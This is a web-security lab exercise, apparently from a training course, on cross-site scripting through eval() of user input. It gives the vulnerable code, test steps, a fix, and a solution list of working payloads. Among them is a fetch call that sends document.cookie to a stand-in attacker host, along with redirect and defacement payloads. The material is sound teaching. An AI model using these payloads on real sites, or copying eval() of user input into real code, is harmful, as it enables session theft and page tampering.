🔹 Lab #25 · Critical XSS

eval() of User-Controlled String

The eval() function executes any JavaScript code passed to it as a string. This is EXTREMELY DANGEROUS when used with user input.

WARNING: eval() is one of the most dangerous JavaScript functions. It executes any code passed to it, giving attackers complete control over the page.
TEST:
1. Type alert("XSS!") in the textarea
2. Click "Execute eval()" → Alert pops immediately!
3. Try more complex code like document.body.style.backgroundColor = "red"

Click "Execute eval()" or click a payload button above.
WHY eval() IS DANGEROUS:
• eval() executes ANY JavaScript code
• An attacker can steal cookies, session tokens, or data
• They can redirect users, deface pages, or perform actions as the user
• NEVER use eval() with user input!
Hints
  • Type: alert("XSS") and click Execute
  • Try: document.location = "https://example.com" (redirect)
  • Try: document.body.innerHTML = "<h1>HACKED!</h1>"
  • Try: console.log("This runs in console")

Solution

Working Payloads (any JavaScript works):

  • alert('XSS') - Simple alert
  • alert(document.cookie) - Steal cookies
  • document.location = 'https://evil.com' - Redirect
  • document.body.innerHTML = '<h1>Hacked</h1>' - Deface page
  • fetch('https://attacker.com/steal?cookie=' + document.cookie) - Steal data

Vulnerable Code:

let userCode = document.getElementById('input').value;
eval(userCode);  // EXTREMELY DANGEROUS!

Fix: NEVER use eval(). Find alternative safe approaches for your use case.

From URL: ?code=alert('XSS') also works if the page reads from URL parameters.
